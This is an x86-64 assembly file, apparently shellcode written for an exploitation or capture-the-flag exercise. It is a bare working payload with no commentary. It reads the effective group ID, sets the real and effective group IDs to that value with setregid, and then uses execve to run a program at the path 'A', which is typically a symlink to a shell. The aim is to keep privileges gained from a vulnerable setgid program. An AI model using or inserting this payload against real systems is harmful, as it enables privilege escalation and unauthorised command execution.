#include <sys/syscall.h>

.globl  main
.type   main, @function

main:

    push $SYS_getegid
    pop %rax
    syscall

    push %rax
    push %rax
    pop %rsi
    pop %rdi
    push $SYS_setregid
    pop %rax
    syscall

    push %rdx
    pop %rsi
    push $SYS_execve
    pop %rax

    push $0x41
    push %rsp
    pop %rdi

    syscall
